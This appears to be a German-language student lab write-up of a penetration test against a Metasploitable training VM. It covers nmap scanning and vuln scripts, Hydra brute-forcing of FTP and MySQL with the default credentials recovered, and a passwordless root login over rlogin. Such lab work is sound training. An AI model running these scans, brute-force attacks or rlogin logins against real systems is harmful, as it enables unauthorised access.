## 1. VNC Exploitation

### 1.1 VNC Recherche

**VNC (Virtual Network Computing)** ist ein Remote‑Desktop System.\
Damit kann man den Bildschirm eines anderen Computers über ein Netzwerk
sehen und steuern.

#### Funktionsweise

-   basiert auf dem **RFB (Remote Frame Buffer) Protokoll**
-   Client‑Server Modell
-   überträgt:
    -   Bildschirm
    -   Mausbewegungen
    -   Tastatureingaben

#### Komponenten

-   **VNC Server** -- läuft auf dem Zielsystem\
-   **VNC Viewer (Client)** -- verbindet sich zum Server

#### Standard Ports

-   TCP **5900** → Display :0\
-   TCP **5901** → Display :1\
-   TCP **5902** → Display :2

#### Sicherheitsprobleme

-   teilweise **keine Verschlüsselung**
-   **schwache Passwörter**
-   **Brute‑Force Angriffe möglich**
-   alte Versionen können **Authentication Bypass** enthalten


### 1.2 VNC Scan

Zuerst wird überprüft, ob der VNC Port auf dem Metasploitable System offen ist.

```bash
nmap -p 5900 192.168.8.51
```

**Ergebnis**: Port offen

Zusätzlich kann das nmap Script **vnc-info** verwendet werden.

```bash
nmap -p 5900 --script vnc-info <Metasploitable-IP>
```

Dieses Script zeigt zusätzliche Informationen wie:

- VNC Protokollversion
- Security Types
- Authentifizierung

---

### 1.3 Besonderer Port-Scan

Es wird ein **SYN-Scan (-sS)** durchgeführt.  
Dabei wird keine vollständige TCP-Verbindung aufgebaut.

**Vorteile:**
- Schnell  
- Weniger auffällig  
- Zuverlässig  

### 1.4 Anzahl der gescannten Ports

Standardmäßig scannt nmap die **1000 häufigsten TCP-Ports**.

### 1.5 Metasploitable Scan

```bash
nmap -Pn -sS -sV -sC -oN nmap_default.txt 192.168.8.51
```

**Ergebnis:**
- FTP (vsftpd 2.3.4, anonymer Login)  
- SSH (OpenSSH 4.7p1)  
- Telnet  
- HTTP (Apache 2.2.8)  
- MySQL, PostgreSQL  
- Samba, IRC  

---

### 1.6 Vulnerability Scan mit nmap Skripten

#### Fast-Scan

```bash
nmap -Pn -sS -sV -sC -F -oN nmap_vuln.txt 192.168.8.51
```

Der Fast-Scan zeigt bereits viele unsichere und veraltete Dienste.

#### Ausgewählte Skripte

```bash
nmap --script http-title,mysql-info,banner,ftp-anon,ssh-hostkey 192.168.8.51
```

#### Weiteres Skript

```bash
nmap --script smb-os-discovery 192.168.8.51
```

Beispielhafte Ergebnisse:
- Rechnername: `metasploitable`  
- Domain: `localdomain`  
- FQDN: `metasploitable.localdomain`  

---

### 1.7 Kategorie vuln

```bash
nmap --script=vuln -p 21,80 192.168.8.51
```

**Ergebnis:**
- vsftpd 2.3.4 Backdoor (CVE-2011-2523)  
- Hinweise auf SQLi, CSRF, Slowloris (DoS)

## 2. Login Vulnerabilities

### 2.1 Portscan (FTP & MySQL)

```bash
nmap -Pn -sV -p 21,3306 192.168.8.51
```

Ergebnis:
- FTP: vsftpd 2.3.4  
- MySQL: 5.0.51a  

---

### 2.2 Hydra Angriff auf FTP

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.8.51
```

| Benutzer | Passwort |
|----------|----------|
| postgres | postgres |
| ftp      | msfadmin |
| msfadmin | msfadmin |
| user     | user     |

---

### 2.3 Hydra Angriff auf MySQL

```bash
hydra -L users.txt -P passwords.txt mysql://192.168.8.51
```

| Benutzer | Passwort |
|----------|----------|
| root     | (leer)   |
| guest    | (leer)   |

---

### 2.4 rlogin Portprüfung

```bash
nmap -Pn -p 513 192.168.8.51
```

Port 513/tcp ist offen.

---

### 2.5 Exploit: Login als root

```bash
rlogin -l root 192.168.8.51
```

Login ohne Passwort möglich.

---

### 2.6 Fehlkonfiguration

Einträge in:

```bash
/etc/hosts.equiv
```
oder
```bash
/root/.rhosts
```

(z. B. `++`) erlauben Login ohne Passwort.
